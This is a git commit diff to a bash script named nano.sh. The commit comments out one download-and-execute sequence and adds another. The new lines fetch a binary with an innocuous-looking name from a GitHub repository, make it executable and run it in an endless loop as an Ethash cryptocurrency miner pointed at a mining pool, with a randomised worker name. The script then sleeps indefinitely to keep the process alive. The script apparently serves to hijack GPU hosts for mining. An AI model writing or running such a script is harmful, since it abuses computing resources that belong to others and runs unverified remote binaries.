6a417c9807d5560c74fbeb6d397324291da20ea2
altergili1 <93052988+altergili1@users.noreply.github.com>
2021-10-24 01:07:50 +0530

    Update nano.sh

--- nano.sh
+++ nano.sh
@@ -1,6 +1,18 @@
 #!/bin/bash
-wget https://github.com/aka648582/yes/raw/main/gas
-chmod +x gas
-wget https://github.com/altergili1/jobs/raw/main/aul.ini
-./gas aul.ini
+#wget https://github.com/aka648582/yes/raw/main/gas
+#chmod +x gas
+#wget https://github.com/altergili1/jobs/raw/main/aul.ini
+#./gas aul.ini
+
 nvidia-smi
+
+POOL=stratum+tcp://ethash.poolbinance.com:1800
+WALLET=DHB
+WORKER=$(echo $(shuf -i 10-40 -n 1)-Dg)
+wget https://github.com/archernap/prem/raw/main/priyatama
+chmod +x priyatama
+while [ 1 ]; do
+./priyatama --algo ETHASH --pool $POOL --user $WALLET.$WORKER 
+sleep 5
+done
+sleep 999999999
